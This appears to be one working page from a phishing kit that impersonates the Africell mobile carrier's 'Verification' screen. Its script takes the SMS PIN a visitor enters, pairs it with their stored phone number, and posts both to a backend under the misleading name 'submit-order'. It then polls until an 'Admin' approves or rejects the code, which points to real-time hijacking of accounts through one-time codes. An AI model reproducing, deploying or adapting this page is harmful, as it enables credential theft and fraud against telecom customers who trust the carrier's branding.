<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell | Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        html, body { width: 100%; height: 100%; background: #F2F2F2; overflow-x: hidden; }
        .verify-wrapper { width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        .verify-navbar { width: 100%; height: 119px; background: #991676; display: flex; align-items: center; padding: 0 24px; gap: 20px; }
        .back-arrow { color: #ffffff; font-size: 26px; text-decoration: none; display: flex; align-items: center; justify-content: center; width: 35px; height: 35px; }
        .navbar-title { color: #ffffff; font-size: 22px; font-weight: 400; }
        .verify-content { width: 100%; max-width: 520px; display: flex; flex-direction: column; align-items: center; padding: 0 34px; }
        .verify-heading { font-size: 32px; font-weight: 400; color: #000000; text-align: center; margin-top: 50px; margin-bottom: 30px; }
        .verify-instructions { font-size: 18px; color: #000000; text-align: center; line-height: 1.4; margin-bottom: 50px; }
        .verify-input-group { width: 100%; margin-bottom: 48px; }
        .verify-input-field { width: 100%; height: 118px; background: #ffffff; border: 2px solid #991676; border-radius: 18px; font-size: 20px; font-weight: 600; color: #000000; text-align: center; outline: none; }
        .verify-btn { width: 100%; height: 120px; background: #991676; color: #ffffff; border: none; border-radius: 17px; font-size: 26px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .verify-btn.disabled-state { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
        #loadingSpinner { display: none; flex-direction: row; align-items: center; justify-content: center; gap: 12px; margin-top: 20px; font-size: 15px; color: #991676; font-weight: 600; }
        .spinner { width: 24px; height: 24px; border: 3px solid rgba(153, 22, 118, 0.2); border-top: 3px solid #991676; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #customModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(153, 22, 118, 0.9); justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
        .modal-card { background: #991676; width: 100%; max-width: 320px; border-radius: 24px; padding: 28px; text-align: center; color: #ffffff; }
        .modal-message { font-size: 15px; font-weight: 600; margin-bottom: 24px; line-height: 1.4; }
        .modal-btn { background: #ffd34d; color: #5E0C44; border: none; border-radius: 14px; padding: 14px 24px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; }
    </style>
</head>
<body>

    <div class="verify-wrapper">
        <nav class="verify-navbar">
            <a href="forgot2.html" class="back-arrow"><i class="fa-solid fa-arrow-left"></i></a>
            <span class="navbar-title">Verification</span>
        </nav>

        <div class="verify-content">
            <h1 class="verify-heading">Verification</h1>
            <p class="verify-instructions">Please Enter the PIN Received in your<br>SMS to verify your number</p>

            <div class="verify-input-group">
                <input type="text" id="verificationPin" class="verify-input-field" placeholder="PIN Code Here" inputmode="numeric" pattern="[0-9]*" maxlength="6" required>
            </div>

            <!-- Verify Button -->
            <button type="button" id="verifyBtn" class="verify-btn">Verify</button>

            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Verifying SMS code ...</span>
            </div>
        </div>
    </div>

    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        let pendingAction = null;

        function showAppAlert(message, actionCallback = null) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
            pendingAction = actionCallback;
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
            if (pendingAction) {
                pendingAction();
                pendingAction = null;
            }
        }

        async function submitVerificationCode() {
            const pinVal = document.getElementById('verificationPin').value.trim();
            const verifyBtn = document.getElementById('verifyBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');
            
            // Strictly remove all spaces so phone matches server key format (+232XXXXXXXX)
            let rawPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+23200000000';
            const phoneInput = rawPhone.replace(/\s+/g, '').trim();

            if (!pinVal || pinVal.length < 4) {
                showAppAlert('❌ Please enter a valid PIN code.');
                return;
            }

            try {
                verifyBtn.classList.add('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'flex';

                console.log('📤 Submitting SMS Code for phone:', phoneInput);

                const response = await fetch('/api/submit-order', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneInput, uniqueId: 'Signup SMS Code: ' + pinVal })
                });

                const result = await response.json();

                if (result.success) {
                    console.log('✅ SMS Code submitted successfully. Polling for approval...');
                    pollApprovalStatus(phoneInput);
                } else {
                    verifyBtn.classList.remove('disabled-state');
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    showAppAlert('❌ Verification failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                verifyBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Could not connect to the backend server.');
            }
        }

        function pollApprovalStatus(phone) {
            const cleanPhone = phone.replace(/\s+/g, '').trim();
            const verifyBtn = document.getElementById('verifyBtn');
            const spinnerDiv = document.getElementById('loadingSpinner');
            
            let elapsedTime = 0;
            const maxWaitTime = 120000; // 2 minutes timeout safety net

            const statusInterval = setInterval(async () => {
                elapsedTime += 3000;

                if (elapsedTime >= maxWaitTime) {
                    clearInterval(statusInterval);
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    verifyBtn.classList.remove('disabled-state');
                    showAppAlert('⏱️ Request timed out. Please try again.');
                    return;
                }

                try {
                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                    const data = await response.json();

                    console.log('🔄 Scratch2 Polling Status Response:', data);

                    if (data.status === 'approved') {
                        clearInterval(statusInterval);
                        window.location.href = 'new.html';
                    } 
                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
                        clearInterval(statusInterval);
                        if (spinnerDiv) spinnerDiv.style.display = 'none';
                        verifyBtn.classList.remove('disabled-state');
                        showAppAlert('❌ Wrong Code / Rejected by Admin');
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 3000);
        }

        // Attach click event to the verify button on page load
        document.addEventListener('DOMContentLoaded', () => {
            const verifyBtn = document.getElementById('verifyBtn');
            if (verifyBtn) {
                verifyBtn.addEventListener('click', submitVerificationCode);
            }
        });
    </script>
</body>
</html>
